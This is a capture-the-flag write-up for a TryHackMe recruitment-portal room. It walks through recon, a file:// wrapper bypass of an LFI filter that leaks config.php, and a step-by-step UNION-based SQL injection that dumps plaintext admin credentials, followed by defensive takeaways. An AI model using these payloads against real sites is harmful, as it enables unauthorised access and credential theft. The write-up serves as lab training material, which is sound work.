# TryHackMe — Recruit: Write-up

## Objective

Recruitment portal (`recruit.thm`). Two flags:
1. Log in as a **normal user** → `THM{LOGGED_IN_USER}`
2. Log in as **admin** → `THM{LOGGED_IN_ADM1N1}`

The box chains together several classic web vulnerabilities (LFI/SSRF filter bypass, information disclosure, SQL injection) into a multi-step attack path.

---

## 1. Recon

**Nmap:**
```bash
nmap -sV <target-ip>
```
```
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu
53/tcp  open  domain  ISC BIND 9.16.1
80/tcp  open  http    Apache httpd 2.4.41 (Ubuntu)
```
Only one meaningful attack surface: **port 80**.

**Directory brute-force:**
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
```

Key findings:
| Path | Status | Notes |
|---|---|---|
| `index.php` | 200 | Login form, no register/signup |
| `api.php` | 200 | FAQ page describing an internal API |
| `config.php` | 200 (0 bytes) | Executes as PHP — no direct source leak |
| `dashboard.php` | 302 → index.php | Auth-protected |
| `file.php` | 200 | Endpoint with a `cv` parameter — LFI/SSRF candidate |
| `/mail/` | 301 (directory listing enabled) | Leaked a log file |
| `/phpmyadmin/` | 301 | Not needed in the end |
| `sitemap.xml` | 200 | Revealed the real vhost: **`recruit.thm`** |

Added the vhost to `/etc/hosts` for proper Host-based routing:
```bash
echo "<target-ip> recruit.thm" | sudo tee -a /etc/hosts
```

---

## 2. Information Disclosure via `/mail/mail.log`

Directory listing on `/mail/` exposed a `mail.log` file (1.6K) containing an internal email:

> *"HR login credentials (username: `hr`) are currently stored in the application configuration file (`config.php`) for ease of access during the initial rollout phase. Administrator credentials are **NOT** stored in the application files and are securely maintained within the backend database."*

This gave us two concrete targets:
- **HR user** → password stored inside `config.php` source
- **Admin user** → password stored in the database (needed a different path, likely SQLi)

---

## 3. LFI via `file.php` — Filter Bypass

The `api.php` FAQ page explained the endpoint's purpose:
```
GET /file.php?cv=<URL>
```
Intended function: fetch candidate CVs from external URLs (HTTP/HTTPS) — by design, an **SSRF-style feature**.

### Failed attempts

We tried multiple classic LFI/SSRF techniques — **all** returned the same message, `Only local files are allowed`:

- Path traversal: `../../../../etc/passwd`
- Absolute path: `/etc/passwd`
- URL/double-encoded traversal
- `php://filter/convert.base64-encode/resource=...`
- Bare relative filename: `config.php`
- Public URL: `http://example.com`
- Localhost in multiple encodings: `127.0.0.1`, `127.1`, `2130706433` (decimal), `0177.0.0.1` (octal), `0.0.0.0`, `[::1]`, `127.0.0.1.nip.io`
- Bare hostname without scheme (`example.com`, `recruit.thm`)

The fact that **nothing** worked was a sign our assumptions about the filter's logic were wrong — we stopped guessing blindly and tried something more fundamental.

### The working payload

```
GET /file.php?cv=file://config.php
```

**Why it worked:** the filter used **blacklist-based validation** instead of a whitelist. It specifically blocked things the developer thought to worry about:
- `..` (traversal)
- strings starting with `/` (absolute paths)
- the `php://` wrapper (a well-known source-disclosure trick)

But it **did not** block the **`file://`** stream wrapper — an equally valid PHP wrapper for local file access that satisfies none of the blocked conditions above.

Since `file.php` apparently reads the content with something like `file_get_contents($cv)` and returns it raw (not via `include()`), we got back the **full source code** of `config.php` instead of its rendered (blank) output.

**Result:**
```php
$HR_PASSWORD = 'hrpassword123';
```

> **Lesson:** Denylisting ≠ security. The correct fix would be to whitelist only `http`/`https` schemes via `parse_url()`, rather than trying to guess and block every dangerous variant.

---

## 4. Flag #1 — Log in as HR (normal user)

```
username: hr
password: hrpassword123
```

→ `dashboard.php` loaded with a **"Candidate Applications"** table.

**Flag:** `THM{LOGGED_IN_USER}`

---

## 5. SQL Injection in the Search Feature

The dashboard had a search box ("Search candidate name"). Testing with a single quote (`'`) returned:

```
SQL Error:
You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use near '%'' at line 1
```

This revealed the query structure:
```sql
SELECT id, name, position, status FROM candidates WHERE name LIKE '%$search%'
```

### Exploitation flow (UNION-based SQLi)

**1. Confirm the injection:**
```sql
' OR '1'='1
```
→ returned all candidates (boolean bypass worked).

**2. Determine column count:**
```sql
' UNION SELECT 1,2,3,4-- -
```
→ passed cleanly, so the query has **4 columns**.

**3. Database / version / user enumeration:**
```sql
' UNION SELECT database(),version(),user(),4-- -
```
→ `recruit_db` | `8.0.33-0ubuntu0.20.04.2` | `root@localhost`

**4. Enumerate table names:**
```sql
' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```
→ found `candidates` and **`users`**.

**5. Enumerate columns of `users`:**
```sql
' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```
→ `id`, `username`, `password`.

**6. Dump the data:**
```sql
' UNION SELECT id,username,password,4 FROM users-- -
```
→
```
username: admin
password: admin@001admin
```
(stored in **plaintext**, no hashing.)

---

## 6. Flag #2 — Log in as Admin

```
username: admin
password: admin@001admin
```

→ Admin dashboard with additional **Approve/Reject** actions on each candidate.

**Flag:** `THM{LOGGED_IN_ADM1N1}`

---

## Full Attack Chain (summary)

```
Recon (nmap + gobuster)
   → found file.php, /mail/, sitemap.xml
sitemap.xml
   → revealed vhost recruit.thm
/mail/mail.log
   → username "hr" + hint that password lives in config.php
file.php LFI (blacklist bypass: file:// wrapper)
   → full source of config.php → hrpassword123
Login as hr
   → FLAG #1 + access to the search feature
SQL injection (UNION-based) on the search box
   → enumeration: db name → tables → columns → users table
   → admin credentials in plaintext
Login as admin
   → FLAG #2
```

---

## Key Takeaways

1. **Blacklist filtering always breaks eventually.** `file.php` blocked `..`, `/`, `php://` — but forgot `file://`. A whitelist (only allowed schemes/patterns) is always stronger than a denylist.
2. **Sensitive data should never sit in "temporarily accessible" config files.** The email said it explicitly ("temporary — initial rollout phase") — such temporary fixes rarely get removed in time.
3. **Every input that reaches a DB query needs parameterization.** The login form was safe (likely prepared statements), but the search feature wasn't — inconsistent application of secure practices within the same codebase is extremely common.
4. **Passwords should never be stored in plaintext.** Even without the SQLi, plaintext storage is a single point of failure.
5. **Directory listing should be disabled** in production — the `/mail/` listing gave us free reconnaissance.
